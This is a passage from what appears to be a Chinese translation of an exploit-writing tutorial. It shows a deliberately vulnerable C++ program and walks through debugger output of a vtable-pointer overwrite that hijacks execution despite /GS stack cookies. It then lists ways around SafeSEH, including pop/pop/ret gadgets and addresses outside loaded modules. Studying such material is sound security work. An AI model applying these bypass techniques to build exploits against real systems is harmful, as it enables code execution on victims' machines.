virtual void __declspec(noinline) bar()
{
}
};
int main()
{
Foo foo;
foo.gs3(
"AAAA"
"BBBB"
"CCCC"
"DDDD"
"EEEE"
"FFFF"
return 0;
}
Foo对象在main函数的堆栈中分配空间，并在main函数中被调用，然后对象Foo被做为参数传递给存在
漏洞的成员函数gs3（如果把大于8字节的字符串拷贝到buf，buf就会被溢出。）。
完成拷贝后，一个虚函数会被执行，因为前边的溢出，堆栈中指向虚函数表的指针可能已经被覆盖，这样
就可以把程序的执行流重定向到shellcode中。
开启/GS进行编译，gs3函数反汇编如下：
0:000> uf Foo::gs3
gsvtable!Foo::gs3
10 00401000 55 push ebp
10 00401001 8bec mov ebp,esp
10 00401003 83ec20 sub esp,20h
10 00401006 a118304000 mov eax,dword ptr [gsvtable!__security_cookie
(00403018)]
10 0040100b 33c5 xor eax,ebp
10 0040100d 8945fc mov dword ptr [ebp-4],eax
10 00401010 894df0 mov dword ptr [ebp-10h],ecx
12 00401013 8b4508 mov eax,dword ptr [ebp+8]
12 00401016 8945ec mov dword ptr [ebp-14h],eax
12 00401019 8d4df4 lea ecx,[ebp-0Ch]
12 0040101c 894de8 mov dword ptr [ebp-18h],ecx
12 0040101f 8b55e8 mov edx,dword ptr [ebp-18h]
12 00401022 8955e4 mov dword ptr [ebp-1Ch],edx
gsvtable!Foo::gs3+0x25
12 00401025 8b45ec mov eax,dword ptr [ebp-14h]
12 00401028 8a08 mov cl,byte ptr [eax]
12 0040102a 884de3 mov byte ptr [ebp-1Dh],cl
12 0040102d 8b55e8 mov edx,dword ptr [ebp-18h]
12 00401030 8a45e3 mov al,byte ptr [ebp-1Dh]
12 00401033 8802 mov byte ptr [edx],al
12 00401035 8b4dec mov ecx,dword ptr [ebp-14h]
12 00401038 83c101 add ecx,1
12 0040103b 894dec mov dword ptr [ebp-14h],ecx
12 0040103e 8b55e8 mov edx,dword ptr [ebp-18h]
12 00401041 83c201 add edx,1
12 00401044 8955e8 mov dword ptr [ebp-18h],edx
12 00401047 807de300 cmp byte ptr [ebp-1Dh],0
12 0040104b 75d8 jne gsvtable!Foo::gs3+0x25 (00401025)
gsvtable!Foo::gs3+0x4d
13 0040104d 8b45f0 mov eax,dword ptr [ebp-10h]
13 00401050 8b10 mov edx,dword ptr [eax]
13 00401052 8b4df0 mov ecx,dword ptr [ebp-10h]
13 00401055 8b02 mov eax,dword ptr [edx]
13 00401057 ffd0 call eax ;this is where bar() is called (via vtable
ptr)
14 00401059 8b4dfc mov ecx,dword ptr [ebp-4]
14 0040105c 33cd xor ecx,ebp
14 0040105e e854000000 call gsvtable!__security_check_cookie (004010b7)
14 00401063 8be5 mov esp,ebp
14 00401065 5d pop ebp
14 00401066 c20400 ret 4
堆栈中cookie :
0:000> dd 00403018
00403018 cd1ee24d 32e11db2 ffffffff ffffffff
00403028 fffffffe 00000001 004020f0 00000000
00403038 56413f2e 406f6f46 00000040 00000000
00403048 00000001 00343018 00342980 00000000
00403058 00000000 00000000 00000000 00000000
虚函数bar反汇编如下:
0:000> uf Foo::bar
gsvtable!Foo::bar
16 00401070 55 push ebp
16 00401071 8bec mov ebp,esp
16 00401073 51 push ecx
16 00401074 894dfc mov dword ptr [ebp-4],ecx
17 00401077 8be5 mov esp,ebp
17 00401079 5d pop ebp
17 0040107a c3 ret
如果我们在gs3被调用的时候观察堆栈（在0×00401000上设置断点）:
- 0×0012ff70 = 保存的返回地址
- 0×0012ff74 = 参数
- 0×0012ff78 = 虚函数表指针 (指向 0×0040211c)
0:000> u 0040211c
gsvtable!Foo::`vftable':
0040211c 7010 jo gsvtable!_load_config_used+0xe (0040212e)
0040211e 40 inc eax
0040211f 004800 add byte ptr [eax],cl
00402122 0000 add byte ptr [eax],al
00402124 0000 add byte ptr [eax],al
00402126 0000 add byte ptr [eax],al
00402128 0000 add byte ptr [eax],al
0040212a 0000 add byte ptr [eax],al
拷贝开始前，堆栈的布局是这样的:
(首先在堆栈上分配了32字节的有效空间（sub esp,20）,esp指向了0×0012ff4c。)
在堆栈地址0×0012FF78上，我们可以看到虚函数表指针，在地址 0×0012ff5c上存放着0012ff78（译
注:图中和这里说的不一致）。
cookie首先被放到eax中并且和ebp进行异或操作，然后被放到堆栈上（在0×001268处）
把AAAABBBBCCCCDDDD拷贝到堆栈上以后（这时已经溢出了buff[]）,我们已经用CCCC覆盖了cookie，我
们即将用EEEE覆盖返回地址。
溢出后，堆栈是这个样子:
内存0×0012ff5c 依然指向0×0012ff78（0×0012ff78中保存着虚函数表指针0×0040211c）.
执行完拷贝之后（堆栈被溢出），地址0040104D上的指令尝试获取虚函数bar的地址并放到eax中。
在这些指令被执行前，寄存器环境如下：
接着，这四条指令被执行，尝试加载函数地址到eax中…
0040104D |. 8B45 F0 MOV EAX,DWORD PTR SS:[EBP-10]
00401050 |. 8B10 MOV EDX,DWORD PTR DS:[EAX]
00401052 |. 8B4D F0 MOV ECX,DWORD PTR SS:[EBP-10]
00401055 |. 8B02 MOV EAX,DWORD PTR DS:[EDX]
这四条指令的执行结果是：
然后,执行指令call eax（尝试执行地址00401070上的虚函数bar()）。
00401057 |. FFD0 CALL EAX ; gsvtable.00401070
但是eax中的数据是我们可以控制的…
=>尽管堆栈中的cookie被破坏了，但我们依然劫持了EIP（因为我们溢出了虚函数表指针，并控制了eax），
ebp和edx都指向我们的缓冲区，因此构造exploit还是相当容易的。
SafeSeh
Safeseh是另一种安全机制，它可以阻止利用SEH的exploit。可通过启用/safeSEH编译选项来把这种机
制应用到所有的执行模块上（文件后缀为.exe，.dll等），（在uninformed v5a2 上可以阅读到更多的
信息）。
除了堆栈保护机制（通过在返回地址前边放置cookie的办法），还增加了对异常处理器的保护，以确保
当seh链被修改时程序直接终止，而不会跳转到shellcode去执行。当异常处理器被执行前，safeSEH会
验证异常处理链是否被修改过。系统会从头到尾遍历异常处理链表，并逐个验证它们的有效性。
如果你覆盖掉异常处理器，你同时也覆盖了指向下一个SEH的指针…这将破坏链表并触发safeseh，微软
的safeseh技术是（截至目前为止）非常有效的。
绕过SafeSeh:导引
如我在第三章所说，只启用safeseh保护机制是可以被绕过的：
->在exploit中不利用SEH（而是通过覆盖返回地址的方法来利用:-)）
或
->如果程序编译的时候没有启用safeseh并且至少存在一个没启用safeseh的加载模块（系统模块或程序
私有模块）。这样就可以用这些模块中的pop/pop/ret指令地址来绕过保护。事实上，建议寻找一个程序
私有模块（没有启用 safeseh），因为它可以使exploit稳定地运行在各种系统版本中。 如果找不到这
样的模块地址也可以使用系统模块中的地址，它也可以工作（同样，只要它没用safeseh进行编译）。
->如果只有应用程序没有启用safeseh保护机制，在特定条件下，你依然可以成功利用，应用程序被加载
的地址有NULL字节，如果在程序中找到了pop/pop/ret指令，你可以使用这个地址（NULL字节会是最后
一个字节），但是你不能把shellcode放在异常处理器之后（因为这样shellcode将不会被拷贝到内存中
– NULL是字符串终止符）因此在这种情况下，这样的exploit仅可以工作在：
–shellcode可以被放在缓冲区中用于覆盖nseh/she的字符串之前。
–能用可以跳转到shellcode的四字节跳转指令覆盖nseh域（一个向后的跳转）。
–仍然可以触发异常（可能并非如此，大多数的异常发生在堆栈溢出时，但是当覆盖到seh时拷贝就中
断了）。
关于seh和safeseh的更多信息可以看这里：
http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-
and-basic-tutorial-part-3-seh/ 和 http://www.corelan.be:8800/index.php/2009/07/28/seh-
based-exploit-writing-tutorial-continued-just-another-example-part-3b/
此外，本章的大部分都是基于David Litchfield所作的工作.
(Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003
Server)
如前所述，从Windows server 2003开始，一个新的保护机制已经产生，这项技术将有助于阻止覆盖异常
处理器的exploit，总之，它是这样工作的:
当异常处理器被调用的时候，ntdll.dll(KiUserExceptionDispatcher)会检测异常处理器是否有效，首先，
它会消除直接跳转到堆栈的跳转代码，它获取栈的高地址，和低地址（通过查询线程信息块（TEB）中的
FS:[4]和FS:[8]）,如果异常处理器的指针在这个范围内（如果指针指向栈地址范围内），这个异常处理
器不会被执行。
如果异常处理器指针不是一个栈中的地址，这个地址会被再次被检查是否在加载模块（包含执行映像自己）
列表中的某个模块的地址范围中，如果是这种情况的话，会再次核查这个地址是否在已注册的异常处理器
列表中。如果存在相匹配的表项的话，异常处理器地址被允许执行，我不打算讨论关于指针检查的细节，
但请记住，检查的重点之一是检查是否有 “Load Configuration Directory”。如果模块没有“Load
Configuration Directory”，该异常处理器将可以被执行。
如果该地址不属于加载模块的范围？那么，在这种情况下该异常处理器被认为是安全的，将可以被执行。
有几种可以绕过这种新型SEH保护机制的利用技术:
- 如果异常处理器的地址在加载模块的地址范围外，这个异常处理器依然可以执行。
- 如果异常处理器的地址在加载模块范围内，但是这个加载模块没有“Load Configuration Directory ”，
这样的DLL将允许我们通过异常处理器的测试，这个异常处理器将可以执行。
- 如果用栈中的地址覆盖异常处理器，它不会被执行，但是如果用堆中的地址来覆盖异常处理器，它将可
以被执行，（当然这需要把攻击代码到堆中，然后在堆中猜测一个可靠的地址，并把程序流程重定向到这
个地址上，这可能是困难的，因为该地址可能无法预测）。
- 如果用一个已注册的并且有助于我们得到控制权的异常处理器覆盖异常处理结构，当然，只有当这个异
常处理器的代码不会打断shellcode并且可以让一个可控的地址获得执行的时候，这种技术才是有效的。
诚然，这种情况十分罕见，但有时的确会发生。
绕过SafeSeh:利用加载模块之外的地址
在进程的加载模块/执行映像中基本都能找到pop/pop/ret这样的指令组合，在构建基于 SEH的exploit
时候,我们通常需要用到这样的指令地址，但这样的指令不是只有在加载模块中才可以找到，如果我们可
以在加载模块之外的地方找到一个包含pop/pop/ret指令的地址，并且这个位置是不变的，你也可以使用
这样的地址，不幸的是，即使可以找到这样的地址，你也会发现，这个地址在不同的系统版本上并不通用。
因此要想成功利用漏洞，可能必须针对特定的系统版本来编写利用程序。
另一个（可能更好）解决这种问题的方法是通过寻找其他的指令集。
call dword ptr[esp+nn] / jmp dword ptr[esp+nn] / call dword ptr[ebp+nn] / jmp dword
ptr[ebp+nn] / call dword ptr[ebp-nn] / jmp dword ptr[ebp-nn]
(偏移nn可能是: esp+8, esp+14, esp+1c, esp+2c, esp+44, esp+50, ebp+0c, ebp+24, ebp+30, ebp-
04, ebp-0c, ebp-18)
另一种做法是，如果esp +8指向EXCEPTION_REGISTRATION结构，那么你仍然可以寻找一个pop/pop/ret
指令组合（在加载模块的地址范围之外的空间），也可以正常工作。
比方说，我们要寻找ebp +30。下边我们把转移指令转换成操作码：
0:000> a
004010cb call dword ptr[ebp+0x30]
call dword ptr[ebp+0x30]
004010ce jmp dword ptr[ebp+0x30]
jmp dword ptr[ebp+0x30]
004010d1
0:000> u 004010cb